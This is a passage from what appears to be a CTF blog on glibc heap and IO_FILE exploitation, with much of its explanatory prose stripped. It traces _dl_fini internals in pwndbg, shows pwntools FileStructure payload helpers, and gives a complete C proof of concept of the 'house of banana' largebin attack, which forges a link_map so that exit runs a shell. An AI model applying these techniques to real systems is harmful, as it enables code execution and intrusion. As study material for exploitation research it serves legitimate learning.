LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>_dl_call_fini</code></p><ul><li> <code>((fini_t)array[sz])()</code>map <code>GL(dl_ns)[ns]._ns_loaded</code>  nextnext-&gt;next</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded  l_next </span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) </span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if link_map3linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p><ul><li></li><li>l_addr, fini_array-&gt;d_un.d_ptr </li><li>DT_FINI_ARRAY  26DT_FINI_ARRAYSZ  28</li><li></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">type = struct &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf64_Xword d_val;</span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure><p> A</p><ul><li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28  <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li><li>l-&gt;l_init_called 0 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>0x312</li><li><code>map.l_info[26]</code>  0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li><li><code>map.l_info[28]</code> + 8 1</li><li> <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code> <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li><li>fini_array <code>map.l_info[26]</code>0x110280x120</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_calledmagic numlinkmap  l_init_called </span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  l_next 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48  d_un </span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]0 26  d_tag </span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28]  d_un  sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure><h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>pwntools <code>IO_FILE</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><ol><li>IO_FILE </li></ol><ul><li><code>_wide_data</code> </li><li> <code>fs.flags = 0x123</code> </li><li> unknown </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>house of orange</li></ol><ul><li>io_list_all </li><li> vtable </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>stdout leak</li></ol><ul><li> addr  size </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>packingfile</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  context.arch  p32p64 </span></span><br><span class="line">flat([</span><br><span class="line">  con1,</span><br><span class="line">  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con,  cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line"><span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#   </span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flat(&#123;&#125;)   alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> largebin attack  house_of_banana</p><h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p> <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana</a>demo</p><ul><li>rtldlibc</li></ul><p>makefile</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -f $(TARGET) </span><br></pre></td></tr></table></figure><p>house of banana</p><ul><li> l_next  0</li><li>l_init_called libc</li><li>ubuntu 22.04 LTS gdb </li><li>libc patch</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//  uaf </span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next  p2</span></span><br><span class="line">  <span class="comment">// linkmap p2</span></span><br><span class="line">  <span class="comment">//  p *(struct link_map *) p2_addr </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// assert i &lt; nloaded  (struct linkmap *p2) -&gt;l_next 0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called 0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; magic number</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// .</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">   0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// gdb </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE </a></li><li><a href="https://bbs.kanxue.com/thread-273895.htm">House of catglibcIO||kanxue.com</a></li><li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple glibcIO</a></li><li><a href="https://www.anquanke.com/post/id/222948">house of banana-</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-2</title>
      <link href="/2023/10/18/Android-2/"/>
